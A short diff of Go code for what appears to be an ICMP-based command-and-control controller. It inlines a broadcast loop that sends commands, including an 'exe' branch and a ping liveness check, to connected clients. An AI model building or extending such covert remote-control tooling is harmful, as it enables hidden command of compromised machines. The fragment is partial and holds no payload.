@@ -196,12 +196,6 @@ func sendmessage(command string, clientid int, c icmp.PacketConn) {
 	send_packets(ipaddr, c)
 }
 
-func sendtoall(message string, c icmp.PacketConn) {
-	for k := range clients {
-		sendmessage(message, k, c)
-	}
-}
-
 func checkalive(src string, payload string) {
 	if payload == "$pong" {
 		ALIVE[src] = true
@@ -372,7 +366,9 @@ func main() {
 		} else if strings.HasPrefix(input, "sendtoall") {
 			_, command, _ := strings.Cut(input, " ")
 			command = strings.TrimRight(command, "\r\n")
-			sendtoall(command, *c)
+			for k := range clients {
+				sendmessage(command, k, *c)
+			}
 
 		} else if strings.HasPrefix(input, "exe") {
 
@@ -394,7 +390,9 @@ func main() {
 			}
 
 		} else if strings.HasPrefix(input, "checkalive") {
-			sendtoall("ping", *c)
+			for k := range clients {
+				sendmessage("ping", k, *c)
+			}
 
 		} else if strings.HasPrefix(input, "help") {
 			print_help()
